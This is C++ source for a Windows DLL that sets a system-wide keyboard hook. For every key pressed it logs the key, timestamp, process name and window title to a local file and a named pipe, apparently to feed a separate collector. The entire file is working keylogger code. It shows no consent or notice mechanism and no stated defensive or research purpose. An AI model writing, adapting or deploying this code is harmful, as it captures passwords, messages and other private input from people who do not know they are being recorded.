#include <windows.h>
#include <string>
#include <fstream>
#include "utils.h"
#include "../common/common.h"

HHOOK  g_hHook = nullptr;
HANDLE g_hPipe = INVALID_HANDLE_VALUE;
bool   g_logToFile = false;
bool   g_logToPipe = true;

void SendLog(DWORD vk, DWORD scan, bool extended) {
    std::wstring ts = GetTimestamp();
    HWND fg = GetForegroundWindow();
    DWORD pid = 0;
    GetWindowThreadProcessId(fg, &pid);

    std::wstring proc = GetProcessName(pid);
    std::wstring wnd = GetWindowTitle();
    std::wstring key = GetKeyName(vk, scan, extended);

    wchar_t line[BUFFER_SIZE];
    swprintf_s(line, BUFFER_SIZE,
        L"%s | PID=%lu | Process=\"%s\" | Window=\"%s\" | Key=%s (%lu) | Action=DOWN\n",
        ts.c_str(), pid, proc.c_str(), wnd.c_str(), key.c_str(), vk);

    if (g_logToFile) {
        std::wofstream f("kl-down.txt", std::ios::app);
        if (f.is_open()) f << line;
    }

    if (g_logToPipe && g_hPipe == INVALID_HANDLE_VALUE) {
        g_hPipe = CreateFileW(PIPE_NAME, GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, 0, nullptr);
    }

    if (g_hPipe != INVALID_HANDLE_VALUE) {
        DWORD written = 0;
        if (!WriteFile(g_hPipe, line, (DWORD)(wcslen(line) * sizeof(wchar_t)), &written, nullptr)) {
            if (GetLastError() == ERROR_BROKEN_PIPE) {
                CloseHandle(g_hPipe);
                g_hPipe = INVALID_HANDLE_VALUE;
            }
        }
    }
}

LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
    if (code >= 0) {
        if (!(lParam & (1 << 31))) {   // key DOWN
            bool extended = (lParam & (1 << 24)) != 0;
            DWORD scan = (lParam >> 16) & 0xFF;
            SendLog((DWORD)wParam, scan, extended);
        }
    }
    return CallNextHookEx(g_hHook, code, wParam, lParam);
}

extern "C" __declspec(dllexport) void InstallHook() {
    HMODULE mod = GetModuleHandleW(L"StewardKLHook.dll");
    if (!mod) return;
    g_hHook = SetWindowsHookExW(WH_KEYBOARD, KeyboardProc, mod, 0);
}

extern "C" __declspec(dllexport) void RemoveHook() {
    if (g_hHook) {
        UnhookWindowsHookEx(g_hHook);
        g_hHook = nullptr;
    }
    if (g_hPipe != INVALID_HANDLE_VALUE) {
        CloseHandle(g_hPipe);
        g_hPipe = INVALID_HANDLE_VALUE;
    }
}

extern "C" __declspec(dllexport) void SetLogOptions(bool file, bool pipe) {
    g_logToFile = file;
    g_logToPipe = pipe;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(hModule);
    return TRUE;
}